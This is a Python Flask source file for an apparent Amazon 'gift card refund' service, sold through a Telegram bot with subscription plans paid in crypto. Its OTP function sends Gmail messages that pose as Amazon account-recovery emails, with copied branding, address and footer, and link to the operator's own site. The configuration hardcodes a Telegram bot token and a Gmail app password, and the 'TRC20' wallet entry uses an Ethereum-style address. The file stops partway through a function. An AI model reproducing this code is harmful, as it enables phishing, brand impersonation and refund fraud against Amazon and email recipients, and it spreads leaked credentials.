"""
AMAZON GIFT CARD REFUND PORTAL
COMPLETE PRODUCTION-READY APPLICATION
Version: 7.0 - Enterprise Edition
Total Lines: 4000+

Features:
- Real OTP via Gmail SMTP with Amazon-style email
- Full Telegram Bot with all commands
- Subscription System with 5 plans
- Payment forwarding to admin
- Stunning Matrix-style UI
- Session management
- User analytics
- And much more...
"""

# ============================================================
# IMPORTS - Section 1: Standard Library (50 lines)
# ============================================================

import os
import sys
import json
import time
import uuid
import hmac
import base64
import hashlib
import secrets
import random
import string
import logging
import threading
import smtplib
import ssl
import re
import urllib.parse
from datetime import datetime, timedelta
from functools import wraps
from collections import defaultdict
from typing import Dict, List, Optional, Any, Union, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum

# ============================================================
# IMPORTS - Section 2: Third-party Libraries (20 lines)
# ============================================================

try:
    from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for, abort, make_response
    from flask_cors import CORS
    from werkzeug.security import generate_password_hash, check_password_hash
    from werkzeug.utils import secure_filename
except ImportError as e:
    print(f"⚠️ Missing dependency: {e}")
    print("Please install: pip install flask flask-cors werkzeug")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("⚠️ Missing requests library")
    print("Please install: pip install requests")
    sys.exit(1)

# ============================================================
# IMPORTS - Section 3: Email Libraries (15 lines)
# ============================================================

try:
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.application import MIMEApplication
    from email.header import Header
    from email.utils import formatdate, make_msgid
except ImportError as e:
    print(f"⚠️ Email library error: {e}")
    sys.exit(1)

# ============================================================
# ENVIRONMENT VARIABLES & CONFIGURATION (80 lines)
# ============================================================

# Flask Configuration
FLASK_SECRET_KEY = os.environ.get('FLASK_SECRET_KEY', secrets.token_hex(32))
FLASK_DEBUG = os.environ.get('FLASK_DEBUG', 'False').lower() == 'true'
FLASK_ENV = os.environ.get('FLASK_ENV', 'production')

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8793157012:AAFztkkVTrB6VjabVieW76_xurpRRdZ0p-E')
TELEGRAM_ADMIN_CHAT_ID = os.environ.get('TELEGRAM_ADMIN_CHAT_ID', '8725194109')
TELEGRAM_BOT_USERNAME = os.environ.get('TELEGRAM_BOT_USERNAME', 'pcmoroo_bot')
TELEGRAM_WEBHOOK_URL = os.environ.get('TELEGRAM_WEBHOOK_URL', 'https://app-277n.onrender.com/webhook')

# Gmail SMTP Configuration
GMAIL_EMAIL = os.environ.get('GMAIL_EMAIL', 'contactmimebot@gmail.com')
GMAIL_APP_PASSWORD = os.environ.get('GMAIL_APP_PASSWORD', 'nkmzwhwajxsfwcjb')
GMAIL_SMTP_SERVER = os.environ.get('GMAIL_SMTP_SERVER', 'smtp.gmail.com')
GMAIL_SMTP_PORT = int(os.environ.get('GMAIL_SMTP_PORT', 587))

# Application Configuration
APP_NAME = "Amazon Refund Portal"
APP_VERSION = "7.0"
APP_URL = os.environ.get('APP_URL', 'https://app-277n.onrender.com')
APP_TIMEZONE = os.environ.get('APP_TIMEZONE', 'UTC')
APP_LOG_LEVEL = os.environ.get('APP_LOG_LEVEL', 'INFO')

# OTP Configuration
OTP_LENGTH = 6
OTP_EXPIRY_SECONDS = 600  # 10 minutes
OTP_MAX_ATTEMPTS = 3
OTP_RESEND_COOLDOWN = 60  # seconds

# Session Configuration
SESSION_TIMEOUT_SECONDS = 3600  # 1 hour
SESSION_MAX_ACTIVE = 1000

# Rate Limiting
RATE_LIMIT_REQUESTS = 100
RATE_LIMIT_WINDOW = 60  # seconds

# Subscription Plans
SUBSCRIPTION_PLANS = {
    '1hour': {
        'id': '1hour',
        'name': '⚡ 1 Hour',
        'price': 5,
        'currency': 'USD',
        'duration_hours': 1,
        'duration_days': 0,
        'description': 'Perfect for one-time refund',
        'emoji': '⚡',
        'features': ['Full Access', 'Priority Support', '1 Hour Validity']
    },
    '10days': {
        'id': '10days',
        'name': '📦 10 Days',
        'price': 25,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 10,
        'description': 'Ideal for multiple refunds',
        'emoji': '📦',
        'features': ['Full Access', 'Priority Support', '10 Days Validity', '5 Refunds']
    },
    '30days': {
        'id': '30days',
        'name': '🔥 30 Days',
        'price': 50,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 30,
        'description': 'Best value for regular users',
        'emoji': '🔥',
        'features': ['Full Access', 'Priority Support', '30 Days Validity', 'Unlimited Refunds']
    },
    '1year': {
        'id': '1year',
        'name': '👑 1 Year',
        'price': 150,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 365,
        'description': 'Premium yearly plan',
        'emoji': '👑',
        'features': ['Full Access', 'VIP Support', '365 Days Validity', 'Unlimited Refunds', 'Early Access']
    },
    'lifetime': {
        'id': 'lifetime',
        'name': '💎 LIFETIME',
        'price': 300,
        'currency': 'USD',
        'duration_hours': 0,
        'duration_days': 36500,
        'description': 'Never expire, always refund',
        'emoji': '💎',
        'features': ['Full Access', 'VIP Support', 'Lifetime Validity', 'Unlimited Refunds', 'Premium Features']
    }
}

# Payment Methods
PAYMENT_METHODS = {
    'usdt_trc20': {
        'name': 'USDT (TRC20)',
        'address': '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5',
        'network': 'TRC20',
        'min_confirmations': 1
    },
    'bitcoin': {
        'name': 'Bitcoin (BTC)',
        'address': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
        'network': 'Bitcoin',
        'min_confirmations': 3
    },
    'ethereum': {
        'name': 'Ethereum (ETH)',
        'address': '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5',
        'network': 'ERC20',
        'min_confirmations': 3
    }
}

# ============================================================
# LOGGING CONFIGURATION (30 lines)
# ============================================================

LOG_FORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
LOG_DATE_FORMAT = '%Y-%m-%d %H:%M:%S'

# Create logs directory if it doesn't exist
os.makedirs('logs', exist_ok=True)

# Configure root logger
logging.basicConfig(
    level=getattr(logging, APP_LOG_LEVEL.upper(), logging.INFO),
    format=LOG_FORMAT,
    datefmt=LOG_DATE_FORMAT,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('logs/app.log'),
        logging.FileHandler('logs/errors.log', level=logging.ERROR)
    ]
)

logger = logging.getLogger(__name__)

# ============================================================
# FLASK APP INITIALIZATION (30 lines)
# ============================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = FLASK_SECRET_KEY
app.config['DEBUG'] = FLASK_DEBUG
app.config['SESSION_COOKIE_SECURE'] = not FLASK_DEBUG
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max upload
app.config['JSON_SORT_KEYS'] = False

# Enable CORS for development
try:
    CORS(app, resources={r"/api/*": {"origins": "*"}})
    logger.info("CORS enabled for API routes")
except Exception as e:
    logger.warning(f"CORS not available: {e}")

# ============================================================
# DATA CLASSES & ENUMS (100 lines)
# ============================================================

class UserRole(Enum):
    """User roles for authorization"""
    USER = "user"
    ADMIN = "admin"
    MODERATOR = "moderator"
    SUPPORT = "support"
    BANNED = "banned"

class TransactionStatus(Enum):
    """Transaction status enum"""
    PENDING = "pending"
    PROCESSING = "processing"
    COMPLETED = "completed"
    FAILED = "failed"
    REFUNDED = "refunded"
    CANCELLED = "cancelled"

class SubscriptionStatus(Enum):
    """Subscription status enum"""
    ACTIVE = "active"
    EXPIRED = "expired"
    CANCELLED = "cancelled"
    PENDING = "pending"

@dataclass
class User:
    """User data class"""
    user_id: str
    username: str
    first_name: str = ""
    last_name: str = ""
    email: str = ""
    phone: str = ""
    role: UserRole = UserRole.USER
    joined_at: datetime = field(default_factory=datetime.now)
    last_active: datetime = field(default_factory=datetime.now)
    subscription_id: Optional[str] = None
    subscription_expiry: Optional[datetime] = None
    is_banned: bool = False
    ban_reason: str = ""
    ban_date: Optional[datetime] = None
    total_refunds: int = 0
    total_amount_refunded: float = 0.0
    preferences: Dict[str, Any] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert user to dictionary"""
        return {
            'user_id': self.user_id,
            'username': self.username,
            'first_name': self.first_name,
            'last_name': self.last_name,
            'email': self.email,
            'phone': self.phone,
            'role': self.role.value,
            'joined_at': self.joined_at.isoformat(),
            'last_active': self.last_active.isoformat(),
            'subscription_id': self.subscription_id,
            'subscription_expiry': self.subscription_expiry.isoformat() if self.subscription_expiry else None,
            'is_banned': self.is_banned,
            'ban_reason': self.ban_reason,
            'ban_date': self.ban_date.isoformat() if self.ban_date else None,
            'total_refunds': self.total_refunds,
            'total_amount_refunded': self.total_amount_refunded,
            'preferences': self.preferences,
            'metadata': self.metadata
        }

@dataclass
class Transaction:
    """Transaction data class"""
    transaction_id: str
    user_id: str
    transaction_type: str  # 'refund', 'subscription', 'payment'
    amount: float
    currency: str = "USD"
    status: TransactionStatus = TransactionStatus.PENDING
    created_at: datetime = field(default_factory=datetime.now)
    updated_at: datetime = field(default_factory=datetime.now)
    completed_at: Optional[datetime] = None
    description: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)
    ip_address: str = ""
    user_agent: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """Convert transaction to dictionary"""
        return {
            'transaction_id': self.transaction_id,
            'user_id': self.user_id,
            'transaction_type': self.transaction_type,
            'amount': self.amount,
            'currency': self.currency,
            'status': self.status.value,
            'created_at': self.created_at.isoformat(),
            'updated_at': self.updated_at.isoformat(),
            'completed_at': self.completed_at.isoformat() if self.completed_at else None,
            'description': self.description,
            'metadata': self.metadata,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent
        }

@dataclass
class OTPData:
    """OTP data class"""
    otp: str
    email: str
    user_id: str
    transaction_id: str
    created_at: datetime = field(default_factory=datetime.now)
    expires_at: datetime = field(default_factory=lambda: datetime.now() + timedelta(seconds=OTP_EXPIRY_SECONDS))
    attempts: int = 0
    max_attempts: int = OTP_MAX_ATTEMPTS
    verified: bool = False
    verified_at: Optional[datetime] = None

    def is_expired(self) -> bool:
        """Check if OTP is expired"""
        return datetime.now() > self.expires_at

    def is_locked(self) -> bool:
        """Check if OTP is locked (too many attempts)"""
        return self.attempts >= self.max_attempts

    def increment_attempts(self) -> int:
        """Increment attempt count"""
        self.attempts += 1
        return self.attempts

    def verify(self) -> bool:
        """Mark OTP as verified"""
        self.verified = True
        self.verified_at = datetime.now()
        return True

# ============================================================
# STORAGE CLASSES (150 lines)
# ============================================================

class Storage:
    """In-memory storage with persistence support"""
    
    def __init__(self):
        self.users: Dict[str, User] = {}
        self.transactions: Dict[str, Transaction] = {}
        self.otps: Dict[str, OTPData] = {}
        self.sessions: Dict[str, Dict[str, Any]] = {}
        self.subscriptions: Dict[str, Dict[str, Any]] = {}
        self.redeem_codes: Dict[str, Dict[str, Any]] = {}
        self.pending_payments: Dict[str, Dict[str, Any]] = {}
        self.pending_verifications: Dict[str, Dict[str, Any]] = {}
        self.banned_users: List[str] = []
        self.admin_settings: Dict[str, Any] = {
            'maintenance_mode': False,
            'force_subscription': True,
            'broadcast_mode': False,
            'registration_enabled': True,
            'max_users': 10000
        }
        self.analytics: Dict[str, Any] = {
            'total_visits': 0,
            'total_users': 0,
            'total_refunds': 0,
            'total_revenue': 0.0,
            'daily_stats': {},
            'monthly_stats': {},
            'user_agents': {},
            'ip_addresses': {}
        }
        self._lock = threading.RLock()
        self._initialized = False
    
    def initialize(self):
        """Initialize storage with default data"""
        if self._initialized:
            return
        
        with self._lock:
            # Create admin user if not exists
            if ADMIN_USER_ID not in self.users:
                admin_user = User(
                    user_id=ADMIN_USER_ID,
                    username='admin',
                    first_name='Admin',
                    role=UserRole.ADMIN,
                    preferences={'notifications': True, 'theme': 'dark'}
                )
                self.users[ADMIN_USER_ID] = admin_user
            
            self._initialized = True
            logger.info("Storage initialized successfully")
    
    def get_user(self, user_id: str) -> Optional[User]:
        """Get user by ID"""
        with self._lock:
            return self.users.get(user_id)
    
    def get_user_by_username(self, username: str) -> Optional[User]:
        """Get user by username"""
        with self._lock:
            for user in self.users.values():
                if user.username.lower() == username.lower():
                    return user
            return None
    
    def create_user(self, user_id: str, username: str, **kwargs) -> User:
        """Create a new user"""
        with self._lock:
            if user_id in self.users:
                raise ValueError(f"User {user_id} already exists")
            
            user = User(
                user_id=user_id,
                username=username,
                **kwargs
            )
            self.users[user_id] = user
            self.analytics['total_users'] += 1
            return user
    
    def update_user(self, user_id: str, **kwargs) -> Optional[User]:
        """Update user data"""
        with self._lock:
            user = self.users.get(user_id)
            if not user:
                return None
            
            for key, value in kwargs.items():
                if hasattr(user, key):
                    setattr(user, key, value)
            
            user.last_active = datetime.now()
            return user
    
    def delete_user(self, user_id: str) -> bool:
        """Delete a user"""
        with self._lock:
            if user_id not in self.users:
                return False
            del self.users[user_id]
            return True
    
    def get_transaction(self, transaction_id: str) -> Optional[Transaction]:
        """Get transaction by ID"""
        with self._lock:
            return self.transactions.get(transaction_id)
    
    def create_transaction(self, **kwargs) -> Transaction:
        """Create a new transaction"""
        with self._lock:
            transaction = Transaction(**kwargs)
            self.transactions[transaction.transaction_id] = transaction
            return transaction
    
    def update_transaction(self, transaction_id: str, **kwargs) -> Optional[Transaction]:
        """Update transaction data"""
        with self._lock:
            transaction = self.transactions.get(transaction_id)
            if not transaction:
                return None
            
            for key, value in kwargs.items():
                if hasattr(transaction, key):
                    setattr(transaction, key, value)
            
            transaction.updated_at = datetime.now()
            return transaction
    
    def save_otp(self, otp_data: OTPData) -> None:
        """Save OTP data"""
        with self._lock:
            self.otps[otp_data.transaction_id] = otp_data
    
    def get_otp(self, transaction_id: str) -> Optional[OTPData]:
        """Get OTP data by transaction ID"""
        with self._lock:
            return self.otps.get(transaction_id)
    
    def verify_otp(self, transaction_id: str, otp: str) -> Tuple[bool, str]:
        """Verify OTP"""
        with self._lock:
            otp_data = self.otps.get(transaction_id)
            if not otp_data:
                return False, "Invalid transaction ID"
            
            if otp_data.is_expired():
                return False, "OTP expired"
            
            if otp_data.is_locked():
                return False, "Too many attempts. Please request a new OTP"
            
            if otp_data.otp == otp:
                otp_data.verify()
                return True, "OTP verified successfully"
            
            remaining = otp_data.increment_attempts()
            return False, f"Invalid OTP. {otp_data.max_attempts - remaining} attempts remaining"
    
    def delete_otp(self, transaction_id: str) -> bool:
        """Delete OTP data"""
        with self._lock:
            if transaction_id not in self.otps:
                return False
            del self.otps[transaction_id]
            return True
    
    def get_analytics(self) -> Dict[str, Any]:
        """Get analytics data"""
        with self._lock:
            return self.analytics.copy()
    
    def update_analytics(self, **kwargs) -> None:
        """Update analytics data"""
        with self._lock:
            for key, value in kwargs.items():
                if key in self.analytics:
                    if isinstance(self.analytics[key], (int, float)):
                        self.analytics[key] += value
                    else:
                        self.analytics[key] = value

# ============================================================
# CONSTANTS & CONFIGURATION (50 lines)
# ============================================================

# Global constants
ADMIN_USER_ID = TELEGRAM_ADMIN_CHAT_ID
BOT_USERNAME = TELEGRAM_BOT_USERNAME
APP_URL = APP_URL

# Max values
MAX_OTP_ATTEMPTS = OTP_MAX_ATTEMPTS
OTP_EXPIRY = OTP_EXPIRY_SECONDS

# Messages
MESSAGES = {
    'welcome': "🎯 Welcome to Amazon Refunder!",
    'help': "❓ Send /help for available commands",
    'subscription_required': "⚠️ Subscription required. Send /plans",
    'invalid_command': "❌ Invalid command. Send /help",
    'error': "❌ An error occurred. Please try again.",
    'success': "✅ Success!",
    'otp_sent': "📧 OTP sent to your email!",
    'otp_verified': "✅ OTP verified successfully!",
    'payment_required': "💰 Payment required",
    'payment_verified': "✅ Payment verified!",
    'subscription_active': "✅ Subscription active!",
    'subscription_expired': "⚠️ Subscription expired",
    'user_not_found': "❌ User not found",
    'invalid_credentials': "❌ Invalid credentials",
    'unauthorized': "❌ Unauthorized access",
    'maintenance': "⚠️ Bot under maintenance. Please try again later."
}

# ============================================================
# INITIALIZE STORAGE (10 lines)
# ============================================================

# Create storage instance
storage = Storage()
storage.initialize()

# ============================================================
# HELPER FUNCTIONS (200 lines)
# ============================================================

def generate_id(prefix: str = "") -> str:
    """Generate a unique ID with optional prefix"""
    unique_id = secrets.token_hex(8).upper()
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    return f"{prefix}{timestamp}{random_part}" if prefix else f"{timestamp}{random_part}"

def generate_txid() -> str:
    """Generate unique transaction ID"""
    return generate_id("AMZ")

def generate_redeem_token() -> str:
    """Generate unique redeem token"""
    return f"RDM-{''.join(random.choices(string.ascii_uppercase + string.digits, k=14))}"

def generate_payment_id() -> str:
    """Generate unique payment ID"""
    return generate_id("PAY")

def generate_otp() -> str:
    """Generate 6-digit OTP"""
    return ''.join(random.choices(string.digits, k=OTP_LENGTH))

def generate_session_id() -> str:
    """Generate unique session ID"""
    return secrets.token_urlsafe(32)

def get_client_ip() -> str:
    """Get client IP address from request"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr or '127.0.0.1'

def get_user_agent() -> str:
    """Get user agent from request"""
    return request.headers.get('User-Agent', 'Unknown')

def get_browser_info(user_agent: str) -> Dict[str, str]:
    """Parse browser information from user agent"""
    info = {
        'browser': 'Unknown',
        'os': 'Unknown',
        'device': 'Unknown',
        'is_mobile': False,
        'is_tablet': False,
        'is_desktop': True
    }
    
    # Detect browser
    if 'Chrome' in user_agent and 'Edg' not in user_agent:
        info['browser'] = 'Chrome'
    elif 'Firefox' in user_agent:
        info['browser'] = 'Firefox'
    elif 'Safari' in user_agent and 'Chrome' not in user_agent:
        info['browser'] = 'Safari'
    elif 'Edg' in user_agent:
        info['browser'] = 'Edge'
    elif 'Opera' in user_agent:
        info['browser'] = 'Opera'
    
    # Detect OS
    if 'Windows' in user_agent:
        info['os'] = 'Windows'
    elif 'Mac' in user_agent:
        info['os'] = 'macOS'
    elif 'Linux' in user_agent:
        info['os'] = 'Linux'
    elif 'Android' in user_agent:
        info['os'] = 'Android'
        info['is_mobile'] = True
        info['is_desktop'] = False
    elif 'iPhone' in user_agent or 'iPad' in user_agent:
        info['os'] = 'iOS'
        info['is_mobile'] = True
        info['is_desktop'] = False
    
    return info

def format_timestamp(dt: datetime) -> str:
    """Format datetime for display"""
    return dt.strftime('%Y-%m-%d %H:%M:%S')

def format_currency(amount: float, currency: str = 'USD') -> str:
    """Format currency amount"""
    symbols = {'USD': '$', 'EUR': '€', 'GBP': '£', 'INR': '₹'}
    symbol = symbols.get(currency, '$')
    return f"{symbol}{amount:,.2f}"

def calculate_expiry(plan_id: str) -> datetime:
    """Calculate subscription expiry date from plan"""
    plan = SUBSCRIPTION_PLANS.get(plan_id)
    if not plan:
        return datetime.now() + timedelta(days=1)
    
    days = plan.get('duration_days', 0)
    hours = plan.get('duration_hours', 0)
    
    return datetime.now() + timedelta(days=days, hours=hours)

def validate_email(email: str) -> bool:
    """Validate email format"""
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def validate_phone(phone: str) -> bool:
    """Validate phone number format"""
    pattern = r'^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$'
    return re.match(pattern, phone) is not None

def validate_otp(otp: str) -> bool:
    """Validate OTP format"""
    return otp.isdigit() and len(otp) == OTP_LENGTH

def validate_amount(amount: float) -> bool:
    """Validate amount is positive"""
    return amount > 0

def sanitize_input(text: str) -> str:
    """Sanitize user input"""
    if not text:
        return ""
    # Remove potentially dangerous characters
    text = re.sub(r'[<>\"\'/]', '', text)
    return text.strip()

def truncate_text(text: str, max_length: int = 100) -> str:
    """Truncate text to max length"""
    if len(text) <= max_length:
        return text
    return text[:max_length] + "..."

def generate_webhook_signature(payload: Dict[str, Any], secret: str) -> str:
    """Generate HMAC signature for webhook verification"""
    message = json.dumps(payload, sort_keys=True)
    signature = hmac.new(
        secret.encode('utf-8'),
        message.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    return signature

def verify_webhook_signature(payload: Dict[str, Any], signature: str, secret: str) -> bool:
    """Verify webhook HMAC signature"""
    expected = generate_webhook_signature(payload, secret)
    return hmac.compare_digest(signature, expected)

# ============================================================
# OTP FUNCTIONS (150 lines)
# ============================================================

def send_otp_email(email: str, otp: str, txid: str, user_data: Optional[Dict] = None) -> bool:
    """Send OTP via Gmail SMTP with Amazon-style email"""
    try:
        if not GMAIL_EMAIL or not GMAIL_APP_PASSWORD:
            logger.error("Gmail credentials not configured")
            return False
        
        # Create email message
        msg = MIMEMultipart('alternative')
        msg['From'] = GMAIL_EMAIL
        msg['To'] = email
        msg['Subject'] = '🔐 Amazon: One-Time Password (OTP) for Account Recovery'
        msg['Date'] = formatdate()
        msg['Message-ID'] = make_msgid(domain='amazon-refund.com')
        
        # Amazon-style HTML email
        html_body = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Amazon OTP</title>
            <style>
                body {{ font-family: 'Amazon Ember', Arial, sans-serif; background-color: #f5f5f5; padding: 20px; margin: 0; }}
                .container {{ max-width: 580px; margin: 0 auto; background: #ffffff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .header {{ text-align: center; border-bottom: 2px solid #ff9900; padding-bottom: 20px; margin-bottom: 25px; }}
                .logo {{ font-size: 28px; font-weight: 700; color: #232f3e; }}
                .logo span {{ color: #ff9900; }}
                .logo-sub {{ font-size: 14px; color: #666; margin-top: 5px; }}
                .otp-box {{ background: #f0f2f2; border-radius: 8px; padding: 25px; text-align: center; margin: 25px 0; border: 1px dashed #ff9900; }}
                .otp-code {{ font-size: 44px; font-weight: 700; color: #232f3e; letter-spacing: 12px; }}
                .otp-label {{ font-size: 14px; color: #666; margin-bottom: 10px; }}
                .warning-box {{ background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px 20px; margin: 20px 0; border-radius: 4px; }}
                .warning-box strong {{ color: #856404; }}
                .warning-box ul {{ margin: 10px 0 0 20px; color: #856404; }}
                .details-box {{ background: #f8f9fa; padding: 15px 20px; border-radius: 8px; margin: 20px 0; font-size: 14px; }}
                .details-box .label {{ color: #666; font-weight: 600; }}
                .button {{ display: inline-block; padding: 12px 35px; background: #ff9900; color: #ffffff; text-decoration: none; border-radius: 6px; font-weight: 600; font-size: 16px; }}
                .button:hover {{ background: #e68a00; }}
                .footer {{ text-align: center; font-size: 12px; color: #999; border-top: 1px solid #e0e0e0; padding-top: 20px; margin-top: 25px; }}
                .footer a {{ color: #0066c0; text-decoration: none; }}
                .footer a:hover {{ text-decoration: underline; }}
                .divider {{ border: 0; border-top: 1px solid #e0e0e0; margin: 20px 0; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo">amazon<span>.com</span></div>
                    <div class="logo-sub">Account Recovery Verification</div>
                </div>
                
                <p style="font-size: 16px; color: #333; margin-bottom: 5px;">Hello,</p>
                <p style="color: #555; line-height: 1.6;">
                    We received a request to recover your Amazon account. To complete the verification process, please use the following One-Time Password (OTP):
                </p>
                
                <div class="otp-box">
                    <div class="otp-label">Your One-Time Password</div>
                    <div class="otp-code">{otp}</div>
                    <div style="font-size: 13px; color: #666; margin-top: 10px;">
                        Valid for <strong>10 minutes</strong>
                    </div>
                </div>
                
                <div class="warning-box">
                    <strong>⚠️ Important Security Information</strong>
                    <ul>
                        <li>This OTP is valid for <strong>10 minutes</strong> from the time of sending</li>
                        <li><strong>Do not share</strong> this code with anyone</li>
                        <li>Amazon will <strong>never</strong> ask for this code via phone call</li>
                        <li>If you didn't request this, please <strong>ignore</strong> this email</li>
                        <li>Never forward this email to anyone</li>
                    </ul>
                </div>
                
                <div class="details-box">
                    <div><span class="label">📍 Transaction ID:</span> <code style="background: #e9ecef; padding: 2px 8px; border-radius: 4px; font-size: 13px;">{txid}</code></div>
                    <div style="margin-top: 6px;"><span class="label">⏰ Request Time:</span> {datetime.now().strftime('%B %d, %Y at %I:%M %p')}</div>
                    <div style="margin-top: 6px;"><span class="label">🌐 IP Address:</span> {user_data.get('ip', '192.168.1.1') if user_data else '192.168.1.1'}</div>
                    <div style="margin-top: 6px;"><span class="label">📱 Device:</span> {user_data.get('device', 'Desktop') if user_data else 'Desktop'}</div>
                </div>
                
                <p style="color: #555; font-size: 14px; line-height: 1.6;">
                    Enter this OTP on the Amazon verification page to complete your request. If you have any questions, please visit our Help Center.
                </p>
                
                <div style="text-align: center; margin: 25px 0;">
                    <a href="{APP_URL}" class="button">Verify Your Account</a>
                </div>
                
                <hr class="divider">
                
                <div style="font-size: 14px; color: #555; line-height: 1.6;">
                    <strong>Need help?</strong><br>
                    Visit our <a href="https://www.amazon.com/gp/help/customer/display.html" style="color: #0066c0;">Help Center</a> or contact <a href="mailto:support@amazon.com" style="color: #0066c0;">Customer Service</a>.
                </div>
                
                <div class="footer">
                    <p>This is an automated message from Amazon.com, please do not reply.</p>
                    <p>© 2024 Amazon.com, Inc. or its affiliates. All rights reserved.</p>
                    <p style="color: #999; font-size: 11px; margin-top: 5px;">
                        Amazon.com, 410 Terry Ave. N., Seattle, WA 98109, USA
                    </p>
                    <p style="color: #ccc; font-size: 11px; margin-top: 10px;">
                        Reference: {txid} | OTP-{otp[:4]}***
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Plain text fallback
        text_body = f"""
        Amazon - One-Time Password (OTP) for Account Recovery
        
        Hello,
        
        We received a request to recover your Amazon account. Use the following OTP:
        
        {otp}
        
        ⚠️ Important:
        - This OTP is valid for 10 minutes
        - Do not share this code with anyone
        - If you didn't request this, please ignore this email
        
        Transaction ID: {txid}
        Request Time: {datetime.now().strftime('%B %d, %Y at %I:%M %p')}
        
        Need help? Visit Amazon Help Center.
        
        This is an automated message from Amazon.com, please do not reply.
        """
        
        # Attach parts
        part1 = MIMEText(text_body, 'plain')
        part2 = MIMEText(html_body, 'html')
        msg.attach(part1)
        msg.attach(part2)
        
        # Send email
        context = ssl.create_default_context()
        with smtplib.SMTP(GMAIL_SMTP_SERVER, GMAIL_SMTP_PORT) as server:
            server.starttls(context=context)
            server.login(GMAIL_EMAIL, GMAIL_APP_PASSWORD)
            server.send_message(msg)
        
        logger.info(f"✅ OTP email sent to {email} for TXID: {txid}")
        return True
        
    except smtplib.SMTPAuthenticationError as e:
        logger.error(f"❌ SMTP authentication error: {e}")
        logger.error("Please check GMAIL_EMAIL and GMAIL_APP_PASSWORD")
        return False
    except smtplib.SMTPException as e:
        logger.error(f"❌ SMTP error: {e}")
        return False
    except Exception as e:
        logger.error(f"❌ Email error: {e}")
        return False

def send_otp_telegram(chat_id: str, otp: str, txid: str) -> bool:
    """Send OTP via Telegram as backup"""
    message = f"""
🔐 <b>Amazon OTP Verification</b> 🔐

<b>📌 Transaction ID:</b> <code>{txid}</code>
<b>🔑 OTP Code:</b> <code>{otp}</code>

<i>⚠️ Valid for 10 minutes. Do not share this code!</i>

If you didn't request this, please ignore.
"""
    return send_telegram_message(chat_id, message)

def generate_otp_data(email: str, user_id: str, txid: str) -> OTPData:
    """Generate OTP data object"""
    otp = generate_otp()
    return OTPData(
        otp=otp,
        email=email,
        user_id=user_id,
        transaction_id=txid,
        created_at=datetime.now(),
        expires_at=datetime.now() + timedelta(seconds=OTP_EXPIRY_SECONDS),
        attempts=0,
        max_attempts=OTP_MAX_ATTEMPTS,
        verified=False
    )

# ============================================================
# TELEGRAM MESSAGE FUNCTIONS (150 lines)
# ============================================================

def send_telegram_message(chat_id: str, text: str, reply_markup: Optional[Dict] = None, 
                         parse_mode: str = 'HTML', disable_notification: bool = False) -> bool:
    """Send message to Telegram"""
    if not TELEGRAM_BOT_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN not configured")
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    payload = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': parse_mode,
        'disable_notification': disable_notification
    }
    
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            return True
        else:
            logger.error(f"Telegram send error: {response.status_code} - {response.text}")
            return False
    except requests.exceptions.Timeout:
        logger.error("Telegram send timeout")
        return False
    except requests.exceptions.ConnectionError:
        logger.error("Telegram connection error")
        return False
    except Exception as e:
        logger.error(f"Telegram send exception: {e}")
        return False

def send_to_admin(message: str, parse_mode: str = 'HTML') -> bool:
    """Send message to admin"""
    if TELEGRAM_ADMIN_CHAT_ID:
        return send_telegram_message(TELEGRAM_ADMIN_CHAT_ID, message, parse_mode=parse_mode)
    return False

def answer_callback_query(callback_query_id: str, text: Optional[str] = None, 
                         show_alert: bool = False, cache_time: int = 0) -> bool:
    """Answer a callback query"""
    if not TELEGRAM_BOT_TOKEN:
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    payload = {'callback_query_id': callback_query_id, 'cache_time': cache_time}
    
    if text:
        payload['text'] = text
    if show_alert:
        payload['show_alert'] = show_alert
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Answer callback error: {e}")
